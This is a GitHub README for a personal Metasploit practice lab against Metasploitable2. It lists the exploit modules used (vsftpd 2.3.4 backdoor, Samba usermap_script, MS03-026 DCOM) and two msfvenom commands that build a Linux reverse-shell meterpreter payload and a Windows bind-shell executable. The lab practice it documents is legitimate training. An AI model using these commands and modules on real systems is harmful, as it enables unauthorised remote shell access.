# metasploit-practice-lab
Hands-on Metasploit practice using vulnerable VMs like Metasploitable2 to learn exploitation and payload creation.


## 📝 README.md (Professional and recruiter-friendly)

```markdown
# 💣 Metasploit Practice Lab – Exploitation & Payloads

This repository documents my practice using **Metasploit Framework** for penetration testing in safe, isolated environments. All testing was conducted on **legal vulnerable machines** like Metasploitable2 and DVWA.

---

## 🛠️ Tools & Lab Setup

- **Metasploit Framework (msfconsole)**
- **Kali Linux**
- **Metasploitable2** VM (vulnerable target)
- **VirtualBox** or **VMware Workstation**

---

## 🗂️ Repository Structure

```

metasploit-practice-lab/
├── exploits/
│   ├── vsftpd\_234\_backdoor.md
│   ├── samba\_usermap\_script.md
├── payloads/
│   ├── reverse\_shell\_notes.md
│   └── msfvenom\_usage.md
├── screenshots/
│   ├── reverse\_shell\_success.png
│   └── msfconsole\_exploit.png
├── notes/
│   └── metasploit\_basics.md
├── README.md

````

---

## 🔥 Exploits Practiced

### 1️⃣ vsftpd 2.3.4 Backdoor
- Target: Port 21 (FTP)
- Exploit module: `exploit/unix/ftp/vsftpd_234_backdoor`
- Result: Meterpreter shell access

### 2️⃣ Samba Usermap Script (CVE-2007-2447)
- Target: Port 445 (SMB)
- Module: `exploit/multi/samba/usermap_script`
- Result: Gained root shell

### 3️⃣ DCOM Exploit (Windows XP)
- Tested remote Windows exploitation using `exploit/windows/dcerpc/ms03_026_dcom`

---

## 🧪 Payloads Created

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf > shell.elf
````

### Bind Shell

```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > shell.exe
```

---

## 📸 Sample Screenshots

| Exploitation                                   | Reverse Shell                                   |
| ---------------------------------------------- | ----------------------------------------------- |
| ![Exploit](screenshots/msfconsole_exploit.png) | ![Shell](screenshots/reverse_shell_success.png) |

---

## 📚 What I Learned

* How to scan, identify, and exploit known vulnerabilities
* Using `msfvenom` to generate custom payloads
* Managing sessions with Meterpreter
* The importance of patching and vulnerability management

---

## ⚠️ Disclaimer

> This project is for **educational and ethical purposes only**. All activities were performed in a controlled lab environment using legal, vulnerable virtual machines.

---

## 🧠 Next Steps

* Add privilege escalation modules
* Practice post-exploitation techniques
* Combine with Nmap for automated exploitation chains

```

---
